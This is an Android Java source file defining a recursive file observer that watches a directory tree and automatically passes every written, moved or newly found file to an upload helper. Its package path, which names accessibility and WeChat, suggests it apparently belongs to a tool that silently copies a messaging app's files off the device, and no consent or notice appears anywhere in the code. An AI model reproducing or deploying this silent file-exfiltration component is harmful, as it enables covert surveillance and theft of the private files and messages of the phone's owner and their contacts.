package test.com.accessibility.Utilz.wechat;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Stack;

import android.content.Context;
import android.os.FileObserver;
import android.util.Log;

import test.com.accessibility.util.network.AsyncHelper;

public class RecursiveFileObserver extends FileObserver {

    public static int CHANGES_ONLY = CLOSE_WRITE | MOVE_SELF | MOVED_FROM;

    List<SingleFileObserver> mObservers;
    String mPath;
    int mMask;

    private Context mContext;
    private AsyncHelper mFileUploadUtil;

    public RecursiveFileObserver(Context context, String path) {
        this(context, path, CHANGES_ONLY);
    }

    public RecursiveFileObserver(Context context, String path, int mask) {
        super(path, mask);
        mContext = context;
        mFileUploadUtil = new AsyncHelper(mContext, false);
        mPath = path;
        mMask = mask;
    }

    @Override
    public void startWatching() {
        if (mObservers != null) return;
        mObservers = new ArrayList<SingleFileObserver>();
        Stack<String> stack = new Stack<String>();
        stack.push(mPath);

        while (!stack.empty()) {
            String parent = stack.pop();
            mObservers.add(new SingleFileObserver(parent, mMask));
            File path = new File(parent);
            File[] files = path.listFiles();
            if (files == null) continue;
            for (int i = 0; i < files.length; ++i) {
                if (files[i].isDirectory() && !files[i].getName().equals(".")
                        && !files[i].getName().equals("..")) {
                    stack.push(files[i].getPath());
                }
            }
        }
        for (int i = 0; i < mObservers.size(); i++)
            mObservers.get(i).startWatching();
    }

    @Override
    public void stopWatching() {
        if (mObservers == null) return;

        for (int i = 0; i < mObservers.size(); ++i)
            mObservers.get(i).stopWatching();

        mObservers.clear();
        mObservers = null;
    }

    @Override
    public void onEvent(int event, String base_path) {
        File tmpFile = new File(base_path);
        if (tmpFile.isFile()) {
            String []filepaths = new String[1];
            filepaths[0] = base_path;
            mFileUploadUtil.execute(filepaths);
        } else if (tmpFile.isDirectory()) {
            Stack<String> stack = new Stack<String>();
            stack.push(base_path);

            while (!stack.empty()) {
                String parent = stack.pop();
                SingleFileObserver observer = new SingleFileObserver(parent, mMask);
                mObservers.add(observer);
                observer.startWatching();
                File path = new File(parent);
                File[] files = path.listFiles();
                if (files == null) continue;
                for (int i = 0; i < files.length; ++i) {
                    try {
                        if (files[i].isDirectory() && !files[i].getName().equals(".")
                                && !files[i].getName().equals("..")) {
                            stack.push(files[i].getPath());
                        } else if (files[i].isFile()) {
                            String[] filepaths = new String[1];
                            filepaths[0] = files[i].getAbsolutePath();
                            mFileUploadUtil.execute(filepaths);
                        }
                    }catch (Exception e) {
                        Log.d("tluo", "[error] file observer:" + e);
                    }
                }
            }
        }

    }

    //private class SingleFileObserver extends FileObserver {
    class SingleFileObserver extends FileObserver {
        private String mPath;

        public SingleFileObserver(String path, int mask) {
            super(path, mask);
            mPath = path;
        }

        @Override
        public void onEvent(int event, String path) {
            String newPath = mPath + "/" + path;
            RecursiveFileObserver.this.onEvent(event, newPath);
        }

    }
}